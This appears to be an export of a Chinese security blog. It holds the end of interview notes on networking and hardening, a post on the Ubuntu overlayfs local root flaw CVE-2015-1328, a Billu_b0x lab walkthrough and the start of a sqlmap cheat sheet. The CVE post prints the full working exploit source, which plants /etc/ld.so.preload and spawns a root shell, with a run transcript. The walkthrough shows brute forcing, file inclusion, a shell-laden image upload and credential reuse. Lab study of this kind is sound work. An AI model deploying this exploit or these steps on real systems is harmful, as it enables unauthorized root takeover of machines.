开启魔术引号 magic_quotes_qpc=on 尽量不要使用动态变量调用文件，直接写要包含的文件。 web框架漏洞弱点服务端注入之Flask框架中服务端模板注入问题 http://www.freebuf.com/articles/web/135953.html HTTP协议TCP三次握手四次挥手三次握手 客户端 syn 发送到服务端，变成 SYN_SENT 状态 服务端 ack=syn+1 回传syn到客户端，变成SYN_RECV状态 客户端 ack=syn+1， 变成ESTABLISHED状态，传输给服务端 服务端收到ACK后变成ESTABLISHED状态，建立连接 SYN标志位为表示请求连接，ACK表示确认 四次挥手客户端=主动关闭方 客户端FIN-&gt;服务端 服务端ACK=FIN+1-&gt;客户端，服务端到客户端的连接关闭 服务端FIN-&gt;客户端 客户端ACK=FIN+1-&gt;服务端 假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！ MSL=最大段寿命=TTL=最大生存时间=255s 四层模型 应用层 应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等. 传输层 传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP). TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务. 网际互联层 网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。 IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。 网络接入层（即主机-网络层） 网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。 当你输入一个网址，点击访问，会发生什么？查找DNS记录 查看浏览器缓存 查看系统缓存 查看路由器缓存 查找ISP DNS缓存 递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP 建立连接 跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文 常见的状态码OSI七层物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP) OSI四层路由协议你搭建过的最复杂的网络设备是什么使用过什么硬件设备Linux运维启动过程Linux基线规范每个公司有每个公司的基线规范体系，但是答题分为下列五个方面 账号管理和授权 检查特殊账号，是否存在空密码的账户和root权限账户 禁用或删除无用账号 添加口令策略:/etc/login.defs修改配置文件，设置过期时间、连续认证失败次数 禁止root远程登录，限制root用户直接登录。 检查su权限。vi /etc/pam.d/su添加auth required pam_wheel.so group=test 服务 关闭不必要的服务 SSH服务安全 不允许root账号直接登录系统，PermitRootLogin=no 修改SSH使用的协议版本为2 修改允许密码错误次数（默认6次），MaxAuthTries=3 文件系统 设置umask值 vi /etc/profile 添加行 umask 027 设置登录超时 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为 TMOUT=180 日志 启用syslogd日志，配置日志目录权限，或者设置日志服务器 记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。https://www.alibabacloud.com/help/zh/faq-detail/49809.htm IP协议安全要求 远程登录取消telnet采用ssh 设置/etc/hosts.allow和deny 禁止ICMP重定向 禁止源路由转发 防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问) 中间件基线规范（APACHE） https://www.alibabacloud.com/help/zh/faq-detail/52981.htm 配置 账号 授权 日志 session过期时间（防ddos 绑定监听地址 禁止 目录权限 访问外部文件 CGI 非法HTTP方法（PUT DELETE） 隐藏 服务版本号 重定向错误页面 删除 配置文件 默认安装的无用文件 webshell检测思路 https://blog.csdn.net/u011066706/article/details/51175971 webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。 黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。 静态检测静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。 优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。 静态检测配合人工 一个检查工具 https://github.com/he1m4n6a/findWebshell 动态检测Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。 缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。 日志检测使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。 语法检测实现关键危险函数的捕捉方式 统计学检测webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。 典型的代表: NeoPI – https://github.com/Neohapsis/NeoPI 防范webshell https://blog.csdn.net/nohaoye/article/details/46987587 防范的措施大概有三种，第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。 计划任务 https://blog.csdn.net/kx_nullpointer/article/details/21299873 at batch crontab anacron：检测停机期间应该执行但是没有执行的任务，将检测到的任务检测一次 自动化运维编写过什么脚本yum用的什么源（本地自搭，挂载）awk sed的使用排错思路，排错经验网络 防火墙 配置 权限 日志分析ELK的使用和分析 https://www.zhihu.com/question/21427267 Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。 Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。 Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。 举例-阿里规范 用户历史命令记录 缺点：安全性不够。使用x-pack实现安全认证及权限管理功能 事件发生的分析用户权限管理(修改)防火墙IPsec VPN安全监控工具 web进入-&gt;堡垒机-&gt;内部防御HIDS-&gt;内部监控，日志审计 zabbix性能监控工具 HIDS Linux木马查杀常见的设备有啥 防火墙 utm 负载均衡设备 IPS IDS(HIDS基于主机型入侵检测系统) 堡垒机 蜜罐 网闸 waf 扫描器 soc(ossim开源安全信息管理系统) Windows运维基线规范木马查杀脱壳，反汇编 计划任务 控制面板-管理工具-计划任务，在“任务计划程序库”上右键–创建基本任务 schtasks命令 语法: schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | &quot;System&quot;} [/rpPassword]] /? ISO27000和等保(重点等保)说一下ISO27000ISO27000是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个24小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。 PDCA（plan do check action）管理循环 说一下等级保护制度《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。 差异 浅谈信息安全等级保护与ISO27000系列标准的异同 ISSN 1009-3044 等保是以国家安全、社会秩序和公共利益为出发点，构建国家的安全保障体系。27000系列是以保证组织业务的连续性，缩减业务风险，最大化投资收益为目的，保证组织的业务安全 共性算法排序算法：快排 二分 冒泡LDAP注入 http://www.4hou.com/technology/9090.html https://blog.csdn.net/quiet_girl/article/details/50716312 转载于：https://www.hacking8.com/sec-interview/sec-ti.html]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu本地提权漏洞（CVE-2015-1328）]]></title>
    <url>%2F2019%2F03%2F03%2FUbuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[知人者智，自知者明。胜人者有力，自胜者强。 ——老子 漏洞原理：这个漏洞是因为在Ubuntu到15.04 之前的3.19.0-21.21 的linux（又名Linux内核）包中的overlayfs实现没有正确检查上层文件系统目录中的文件创建权限，这允许本地用户通过利用其中的配置来获取root访问权限。任意mount命名空间中都允许使用overlayfs。当在用户命名空间内使用overlayfs 挂载时，一名安全从业者Philip Pettersson发现了权限升级漏洞，本地用户即可利用此漏洞获取系统的管理权限。 报告中是这样说的： “当在上层文件系统目录中创建新文件时，overlayfs文件系统未能正确检查此文件的权限。而这一缺陷则可以被内核中没有权限的进程所利用，只要满足该进程CONFIG_USER_NS=y及overlayfs所拥有得FS_USERNS_MOUNT标志，即允许挂载非特权挂载空间的overlayfs。而这一条件是Ubuntu 12.04、14.04、14.10和15.04版本中的默认配置，所以这些版本的Ubuntu系统都受此漏洞影响。ovl_copy_up_ 函数未能正确检查用户是否有权限向upperdir目录写入文件。而该函数唯一检查的是被修改文件的拥有者是否拥有向upperdir目录写入文件的权限。此外，当从lowerdir目录复制一个文件时，同时也就复制了文件元数据，而并非文件属性，例如文件拥有者被修改为了触发copy_up_程序的用户。” 影响版本： Ubuntu Linux 15.04 Ubuntu Linux 14.10 Ubuntu Linux 14.04 Ubuntu Linux 12.04 漏洞复现：将下面POC代码存放到本地的一个文件内，也可以去EDB网站下载https://www.exploit-db.com/exploits/37292/。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152/*# Exploit Title: ofs.c - overlayfs local root in ubuntu# Date: 2015-06-15# Exploit Author: rebel# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04# CVE : CVE-2015-1328 (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*CVE-2015-1328 / ofs.coverlayfs incorrect permission handling + FS_USERNS_MOUNTuser@ubuntu-server-1504:~$ uname -aLinux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linuxuser@ubuntu-server-1504:~$ gcc ofs.c -o ofsuser@ubuntu-server-1504:~$ iduid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)user@ubuntu-server-1504:~$ ./ofsspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)greets to beist &amp; kaliman2015-05-24%rebel%*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=**/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sched.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mount.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sched.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mount.h&gt;#include &lt;sys/types.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;linux/sched.h&gt;#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n return _real_getuid();\n&#125;\n&quot;static char child_stack[1024*1024];static intchild_exec(void *stuff)&#123; char *file; system(&quot;rm -rf /tmp/ns_sploit&quot;); mkdir(&quot;/tmp/ns_sploit&quot;, 0777); mkdir(&quot;/tmp/ns_sploit/work&quot;, 0777); mkdir(&quot;/tmp/ns_sploit/upper&quot;,0777); mkdir(&quot;/tmp/ns_sploit/o&quot;,0777); fprintf(stderr,&quot;mount #1\n&quot;); if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;) != 0) &#123;// workdir= and &quot;overlay&quot; is needed on newer kernels, also can&apos;t use /proc as lower if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123; fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;); exit(-1); &#125; file = &quot;.access&quot;; chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777); &#125; else file = &quot;ns_last_pid&quot;; chdir(&quot;/tmp/ns_sploit/o&quot;); rename(file,&quot;ld.so.preload&quot;); chdir(&quot;/&quot;); umount(&quot;/tmp/ns_sploit/o&quot;); fprintf(stderr,&quot;mount #2\n&quot;); if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123; if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123; exit(-1); &#125; chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777); &#125; chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777); umount(&quot;/tmp/ns_sploit/o&quot;);&#125;intmain(int argc, char **argv)&#123; int status, fd, lib; pid_t wrapper, init; int clone_flags = CLONE_NEWNS | SIGCHLD; fprintf(stderr,&quot;spawning threads\n&quot;); if((wrapper = fork()) == 0) &#123; if(unshare(CLONE_NEWUSER) != 0) fprintf(stderr, &quot;failed to create new user namespace\n&quot;); if((init = fork()) == 0) &#123; pid_t pid = clone(child_exec, child_stack + (1024*1024), clone_flags, NULL); if(pid &lt; 0) &#123; fprintf(stderr, &quot;failed to create new mount namespace\n&quot;); exit(-1); &#125; waitpid(pid, &amp;status, 0); &#125; waitpid(init, &amp;status, 0); return 0; &#125; usleep(300000); wait(NULL); fprintf(stderr,&quot;child threads done\n&quot;); fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY); if(fd == -1) &#123; fprintf(stderr,&quot;exploit failed\n&quot;); exit(-1); &#125; fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;); fprintf(stderr,&quot;creating shared library\n&quot;); lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777); write(lib,LIB,strlen(LIB)); close(lib); lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;); if(lib != 0) &#123; fprintf(stderr,&quot;couldn&apos;t create dynamic library\n&quot;); exit(-1); &#125; write(fd,&quot;/tmp/ofs-lib.so\n&quot;,16); close(fd); system(&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;); execl(&quot;/bin/su&quot;,&quot;su&quot;,NULL);&#125; 然后将其保存到本地的一个文件里去。 1234567891011121314ica@indishell:~$ chmod 777 Ubuntu_EXP.c //赋予文件权限ica@indishell:~$ gcc Ubuntu_EXP.c -o Ubuntu_EXP //编译程序ica@indishell:~$ lsUbuntu_EXP Ubuntu_EXP.cica@indishell:~$ ./Ubuntu_EXP //执行EXPspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# id //检测提权是否成功uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica)#]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF综合靶机（Billu_b0x）渗透测试]]></title>
    <url>%2F2019%2F03%2F03%2FCTF%E9%9D%B6%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。 下载地址： 链接：https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg提取码：kger复制这段内容后打开百度网盘手机App，操作更方便哦 使用VMware打开虚拟机，设置网络为仅主机模式即可 发现目标：使用nmap的-sP参数去探测在当前局域网内存活的主机 123456789101112131415161718192021222324252627root@kali:~# nmap -sP 192.168.149.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 16:49 CSTNmap scan report for 192.168.149.1Host is up (0.00036s latency).MAC Address: 00:50:56:C0:00:01 (VMware) Nmap scan report for 192.168.149.132 //靶机地址Host is up (0.00019s latency).MAC Address: 00:0C:29:E8:DA:C7 (VMware)Nmap scan report for 192.168.149.254 //网关地址Host is up (0.00091s latency).MAC Address: 00:50:56:F5:FB:82 (VMware)Nmap scan report for 192.168.149.131 //kali主机地址Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds 使用nmap的-sV扫描目标系统开放的服务，-p-表示对目标系统全部端口进行扫描，–script=banner表示使用nmap中的脚本去扫描目标系统的服务版本信息 123456789101112131415root@kali:~# nmap -sV -p- --script=banner 192.168.149.132Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 17:20 CSTNmap scan report for 192.168.149.132Host is up (0.0012s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)|_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.480/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)MAC Address: 00:0C:29:E8:DA:C7 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds 发现目标系统只开放了22端口和80端口，那么先从80端口尝试一番 探测SQL注入漏洞：通过浏览器访问目标系统的80端口，出现下面的页面，需要展示SQL注入技巧，尝试了几个SQL万能密码都没办法成功，那么可以用sqlmap跑一跑，可能能跑出结果 因为使用burpsuite抓包的值是post类型的数据包，所以我们设置的sqlmap命令为： 1sqlmap.py -u &quot;http://192.168.149.132/&quot; --data=&quot;un=admin&amp;ps=123456&amp;login=let%27s+login&quot; --dbms=&quot;mysql&quot; --level=3 --batch 但是跑了好久也没有跑出来，只能换一种方法 目录爆破：试试目录爆破获取可以获取到有用的信息 我平时在Windows下使用的是御剑，kali 中用得是dirb和dirbuster 123456789101112131415161718192021222324252627282930313233343536root@kali:~# dirb http://192.168.149.132-----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sun Mar 3 18:03:34 2019URL_BASE: http://192.168.149.132/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.149.132/ ----+ http://192.168.149.132/add (CODE:200|SIZE:307) + http://192.168.149.132/c (CODE:200|SIZE:1) + http://192.168.149.132/cgi-bin/ (CODE:403|SIZE:291) + http://192.168.149.132/head (CODE:200|SIZE:2793) ==&gt; DIRECTORY: http://192.168.149.132/images/ + http://192.168.149.132/in (CODE:200|SIZE:47559) + http://192.168.149.132/index (CODE:200|SIZE:3267) + http://192.168.149.132/index.php (CODE:200|SIZE:3267) + http://192.168.149.132/panel (CODE:302|SIZE:2469) + http://192.168.149.132/server-status (CODE:403|SIZE:296) + http://192.168.149.132/show (CODE:200|SIZE:1) + http://192.168.149.132/test (CODE:200|SIZE:72) ---- Entering directory: http://192.168.149.132/images/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode &apos;-w&apos; if you want to scan it anyway) -----------------END_TIME: Sun Mar 3 18:03:38 2019DOWNLOADED: 4612 - FOUND: 11 当访问到test文件时，系统提示： 1&apos;file&apos; parameter is empty. Please provide file path in &apos;file&apos; parameter 文件包含：那么可以得出test文件内有一个文件包含函数，那么这里很有可能有个文件包含漏洞 原先构造URL为： 1http://192.168.149.132/test?file=/etc/passwd 发现没有反应，那么可能需要构造post类型数据包 由passwd我们可以得出当时可以登录的账号为root和ica用户 我们可以使用hydra进行爆破试试 1hydra -l root -P /root/dict/1433-pass.txt -T 6 192.168.149.132 ssh 当然hydra是可以爆破成功的，只要字典强大，爆出root密码为roottoor。这个等会用。 我们将刚刚爆破出来的文件一一下载看看里面有没有其他有用的内容 当在查看c.php文件时，发现其存在mysql数据库的账号和密码和数据库名。我们即可以通过数据库连接软件去连接 1234567891011121314151617&lt;?php#header( &apos;Z-Powered-By:its chutiyapa xD&apos; );header(&apos;X-Frame-Options: SAMEORIGIN&apos;);header( &apos;Server:testing only&apos; );header( &apos;X-Powered-By:testing only&apos; );ini_set( &apos;session.cookie_httponly&apos;, 1 );$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);// Check connectionif (mysqli_connect_errno()) &#123; echo &quot;connection failed -&gt; &quot; . mysqli_connect_error(); &#125;?&gt; 获得网站账号biLLu，密码hEx_it，然后成功登陆 在网站发现可以添加用户，并能上传图片，发现只能上传图片文件的后缀才可以，显然网站设置了白名单。 获取shell：我们之前查看test文件包含的时候，下载了panel.php文件，这个文件也存在文件包含的功能 1234567891011121314151617181920212223if(isset($_POST[&apos;continue&apos;]))&#123; $dir=getcwd(); $choice=str_replace(&apos;./&apos;,&apos;&apos;,$_POST[&apos;load&apos;]); if($choice===&apos;add&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; if($choice===&apos;show&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; else &#123; include($dir.&apos;/&apos;.$_POST[&apos;load&apos;]); &#125; &#125; 那我们上传一个图片马上去，然后使用panel.php包含这个文件，成功获取到 刚刚在网上找这类靶机的文章，发现一位大佬爆破出phpmy目录，然后通过猜解路径去下载，这个文件默认路径在/var/www/phpmy下面，那么我们还可以通过文件包含下载这个文件，然后获取到root账号和密码 12345678910111213141516171819202122232425262728293031323334&lt;?php/* Servers configuration */$i = 0;/* Server: localhost [1] */$i++;$cfg[&apos;Servers&apos;][$i][&apos;verbose&apos;] = &apos;localhost&apos;;$cfg[&apos;Servers&apos;][$i][&apos;host&apos;] = &apos;localhost&apos;;$cfg[&apos;Servers&apos;][$i][&apos;port&apos;] = &apos;&apos;;$cfg[&apos;Servers&apos;][$i][&apos;socket&apos;] = &apos;&apos;;$cfg[&apos;Servers&apos;][$i][&apos;connect_type&apos;] = &apos;tcp&apos;;$cfg[&apos;Servers&apos;][$i][&apos;extension&apos;] = &apos;mysqli&apos;;$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;cookie&apos;;$cfg[&apos;Servers&apos;][$i][&apos;user&apos;] = &apos;root&apos;;$cfg[&apos;Servers&apos;][$i][&apos;password&apos;] = &apos;roottoor&apos;; //root密码$cfg[&apos;Servers&apos;][$i][&apos;AllowNoPassword&apos;] = true;/* End of servers configuration */$cfg[&apos;DefaultLang&apos;] = &apos;en-utf-8&apos;;$cfg[&apos;ServerDefault&apos;] = 1;$cfg[&apos;UploadDir&apos;] = &apos;&apos;;$cfg[&apos;SaveDir&apos;] = &apos;&apos;;/* rajk - for blobstreaming */$cfg[&apos;Servers&apos;][$i][&apos;bs_garbage_threshold&apos;] = 50;$cfg[&apos;Servers&apos;][$i][&apos;bs_repository_threshold&apos;] = &apos;32M&apos;;$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_blob_timeout&apos;] = 600;$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_log_threshold&apos;] = &apos;32M&apos;;?&gt; Ubuntu本地提权：那么使用xshell去远程连接目标服务器， 12345root@indishell:~# uname -aLinux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linuxroot@indishell:~# cat /etc/issueUbuntu 12.04.5 LTS \n \l 看到是Ubuntu12.04版本的，那么可以利用Ubuntu著名的本地提权exp 下载地址：https://www.exploit-db.com/exploits/37292 将EXP代码保存带文件内，然后赋予权限，进行编译 1234567891011121314151617181920root@indishell:~# vim exp.croot@indishell:~# chmod 777 exp.c //赋予权限root@indishell:~# gcc exp.c -o exp //编译root@indishell:~# ls exp exp.croot@indishell:~# mv exp /home/ica/ root@indishell:~# su - ica //由于是复现，我们切换用户为ica进行本地越权ica@indishell:~$ica@indishell:~$ lsexpica@indishell:~$ ./exp //执行EXPspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica) //成功越权#]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP速查表]]></title>
    <url>%2F2019%2F03%2F03%2FSQLMAP%2F</url>
    <content type="text"><![CDATA[时光匆匆流逝过，平平淡淡才是真。忍耐任由风雨过，守得云开见月明。 注：由于自己sqlmap命令不是很熟，经常只会使用常见的那几个参数，所以特地写了博客，将所有的命令一个一个的操作了一遍，然后码字，过程是辛苦的，但收货满满，很开心，晚安，世界！ 简介：SQLMAP是开源的渗透测试工具，主要用于自动化监测和利用SQL注入漏洞，它具有功能强大的检测引擎，能针对各种不同类型的数据库去获取数据库服务器的权限，获取数据库所存储的数据，访问并且可以导出操作系统的文件，甚至通过外带数据连接的方式执行操作系统命令。 所支持的DBMS：SQLMAP支持市面上常见的DBMS，包括MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird)和SAP MaxDB。 五种注入模式： 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句直接返回在页面中。 联合查询注入，在使用union联合查询的情况下注入 堆查询注入，可以在同时执行多条语句的情况下注入 七种测试等级：使用参数-v指定对应的测试等级，默认是等级1.如果想看到sqlmap发送的测试payload最好的等级是3,。 1234567·0：只显示Python的回溯、错误和关键消息；·1：同时显示基本信息和警告信息；·2：同时显示调试信息；·3：同时显示注入的payload；·4：同时显示HTTP请求；·5：同时显示HTTP响应头；·6：同时显示HTTP响应页面页面。 基本功能：1.在sqlmap 0.8版本之后，提供了数据库直连的功能，使用参数-d作为SQL数据库的客户端程序来连接数据库的端口，需要安装一些python中的依赖库便可以进行访问，其语法格式为： 1sqlmap.py -d 